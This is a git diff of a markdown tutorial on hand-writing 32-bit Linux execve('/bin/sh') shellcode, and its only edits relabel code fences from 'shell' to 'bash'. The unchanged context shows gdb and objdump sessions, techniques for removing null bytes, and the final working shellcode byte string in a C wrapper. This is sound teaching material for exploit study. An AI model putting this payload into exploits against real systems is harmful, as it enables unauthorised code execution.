@@ -77,7 +77,7 @@ shellcode = "\x90\x90\x90\x90";
 
 Just 4 `NOP` operations, let's compile and
 
-```shell
+```bash
 $ gcc -o shellcode shellcode.c
 $ gdb -q ./shellcode
 Reading symbols from ./shellcode...(no debugging symbols found)...done.
@@ -101,7 +101,7 @@ End of assembler dump.
 
 The interesting part here is to notice
 
-```shell
+```bash
    0x080483f3 <+6>:     mov    $0x80484a0,%eax
    0x080483f8 <+11>:    call   *%eax
 ```
@@ -132,7 +132,7 @@ To call `execve` we will use the famous `int 0x80` which transfer the flow of th
 
 `int 0x80` requires the interrupt number in the `$eax` register, to find the one we want we can run:
 
-```shell
+```bash
 $ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
 #define __NR_execve 11
 ```
@@ -170,7 +170,7 @@ int main(){
 
 The first argument of `argv` is by convention started with the name of the current filename being executed.
 
-```shell
+```bash
 $ gcc -o execve_ls execve_ls.c
 $ ./execve_ls
 bin   dev  home        lib         media  opt   root  sbin  sys  usr      var
@@ -187,7 +187,7 @@ int main(){
 }
 ```
 
-```shell
+```bash
 $ gcc -o execve_sh execve_sh.c
 $ ./execve_sh
 $ exit # the new shell
@@ -310,7 +310,7 @@ Breakpoint 1, 0x08048062 in main ()
 
 Here you can see we can access the string from `eax`, and the strange instructions in `toCall` are just `gdb` interpreting the string as instructions:
 
-```shell
+```bash
    0x08048068 <+5>:     das
    0x08048069 <+6>:     bound  %ebp,0x6e(%ecx)
    0x0804806c <+9>:     das
@@ -321,7 +321,7 @@ Here you can see we can access the string from `eax`, and the strange instructio
 
 Another technique is to push the string to the stack and get back the value of `$esp` after this operation. As you saw previously:
 
-```shell
+```bash
 (gdb) x $eax
 0x8048068 <toCall+5>:   0x6e69622f
 (gdb) x/s $eax
@@ -330,7 +330,7 @@ Another technique is to push the string to the stack and get back the value of `
 
 In memory we don't store the string, but rather the numeric representation of the string. The computer doesn't care how we add the data in memory, so we could just `push` data directly to the stack:
 
-```shell
+```bash
 0x8048068 <toCall+5>:   "/bin/sh"
 (gdb) x/2xw $eax
 0x8048068 <toCall+5>:   0x6e69622f      0x0068732f
@@ -338,7 +338,7 @@ In memory we don't store the string, but rather the numeric representation of th
 
 You can see already that we have a `0x00` byte here, which is never a good idea in an exploit string (because it represents the end of a string, so it could cut the string in half). Instead we can use `//bin/sh` or `/bin//sh` which are both valid:
 
-```shell
+```bash
 (gdb) print /x "/bin//sh"
 $2 = {0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x0}
 ```
@@ -358,7 +358,7 @@ _start:
 
 You can see, once we pushed those values in the stack, `$esp` will point to the string, so we can store it somewhere else. Let's look at that under `gdb`:
 
-```shell
+```bash
 $ nasm -f elf push_example.asm
 $ ld -o push_example push_example.o
 $ gdb -q push_example
@@ -451,7 +451,7 @@ $
 
 Nice! Let's have a look at our shellcode with `objdump`:
 
-```shell
+```bash
 shellcode:     file format elf32-i386
 
 Contents of section .text:
@@ -461,7 +461,7 @@ Contents of section .text:
 
 That's quite nice, but there are a few `00` here, let's have a closer look:
 
-```shell
+```bash
 $ objdump -d shellcode
 
 shellcode:     file format elf32-i386
@@ -527,7 +527,7 @@ We could `inc eax` 11 times, but that would be really long!
 
 Instead we can use the `al` register, which is the last 8 bits of the `eax` register:
 
-```shell
+```bash
 64   32   16   8   0
             [AH][AL]
         [EAX       ]
@@ -565,7 +565,7 @@ _start:
 
 It's a little bit shorter than the previous one, but the real occurs when you look at the generated shellcode:
 
-```shell
+```bash
 $ objdump -s shellcode
 
 shellcode:     file format elf32-i386
@@ -591,7 +591,7 @@ We have our hex instructions, let's put that in our wrapper. Here's a swift way 
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80";
 ```
 
-```shell
+```bash
 $ gcc -o shellcode shellcode.c
 $ ./shellcode
 $ # new shell
